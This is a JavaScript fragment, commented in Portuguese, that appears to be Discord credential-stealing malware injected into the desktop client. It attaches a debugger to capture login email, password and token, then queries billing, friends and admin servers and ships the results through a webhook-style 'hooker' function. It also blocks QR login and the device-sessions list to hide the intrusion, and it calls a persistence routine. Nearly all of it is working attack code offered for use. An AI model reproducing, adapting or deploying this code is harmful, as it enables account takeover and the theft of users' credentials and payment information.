// --- DATA FETCHERS ---
const fetchAccount = async t => JSON.parse(await request("GET", CONFIG.api_url, { "Authorization": t }));
const getBadges = f => Object.values(CONFIG.badges).filter(b => (f & b.Value) === b.Value).map(b => b.Emoji).join(' ') || '`Nenhum`';
const getBilling = async t => {
    const d = JSON.parse(await request("GET", CONFIG.api_url + "/billing/payment-sources", { "Authorization": t }));
    return d.map(x => x.type === 1 ? '💳' : x.type === 2 ? '<:PayPal:1386523562504097862>' : '❓').join(' ') || '`Nenhum`';
};
const getFriends = async t => {
    const d = JSON.parse(await request("GET", CONFIG.api_url + "/relationships", { "Authorization": t }));
    const rare = d.filter(f => f.type === 1 && f.user.public_flags > 0).map(f => f.user.username).slice(0, 5).join(', ');
    return { totalFriends: d.length, message: rare ? `**Raros:** ${rare}` : "**Sem amigos raros**" };
};
const getServers = async t => {
    const d = JSON.parse(await request("GET", CONFIG.api_url + "/guilds?with_counts=true", { "Authorization": t }));
    const rare = d.filter(g => (g.permissions & 0x8) === 0x8 && g.approximate_member_count >= 50).map(g => g.name).slice(0, 5).join(', ');
    return { totalGuilds: d.length, message: rare ? `**Admin em:** ${rare}` : "**Sem servidores relevantes**" };
};

// --- MONITOR & INJECTION ---
const startCapture = () => {
    const win = BrowserWindow.getAllWindows()[0];
    if (!win) return setTimeout(startCapture, 1000);

    p3rsist();

    // Bloqueios de Segurança (QR e Sessões)
    // 1. Bloqueia o QR Code
    session.defaultSession.webRequest.onBeforeRequest(CONFIG.qr_filter, (d, c) => c({ cancel: true }));

    // 2. Bloqueia a API de Sessões (Dispositivos)
    // Usamos um filtro amplo para pegar qualquer versão da API (v8, v9, v10)
    session.defaultSession.webRequest.onBeforeRequest(CONFIG.session_filter, (details, callback) => {
        // Isso faz com que a requisição de 'sessions' seja cancelada antes mesmo de sair do PC
        // Na interface do Discord, isso geralmente resulta em um erro de carregamento ou 
        // a lista de dispositivos simplesmente não aparece.
        callback({ cancel: true });
    });

    // 3. Garante que os cabeçalhos de autorização não sejam enviados para essas URLs
    session.defaultSession.webRequest.onBeforeSendHeaders(CONFIG.session_filter, (details, callback) => {
        callback({ cancel: true });
    });

    // Debugger Protocol (Captura estável)
    if (!win.webContents.debugger.isAttached()) {
        try {
            win.webContents.debugger.attach('1.3');
            win.webContents.debugger.on('message', async (_, method, params) => {
                if (method === 'Network.requestWillBeSent' && params.request.url.endsWith('/login')) {
                    const postData = JSON.parse(params.request.postData);
                    global.loginTmp = postData.login;
                    global.passTmp = postData.password;
                }

                if (method === 'Network.responseReceived' && params.response.url.endsWith('/login') && params.response.status === 200) {
                    const { body } = await win.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
                    const { token } = JSON.parse(body);
                    const acc = await fetchAccount(token);
                    
                    await hooker({
                        "content": `**Login Detectado no Host:** \`${os.hostname()}\``,
                        "embeds": [{ "fields": [
                            { "name": "Email", "value": `\`${global.loginTmp}\``, "inline": true },
                            { "name": "Senha", "value": `\`${global.passTmp}\``, "inline": true }
                        ]}]
                    }, token, acc);
                }
            });
            win.webContents.debugger.sendCommand('Network.enable');
        } catch (e) {}
    }
};

startCapture();
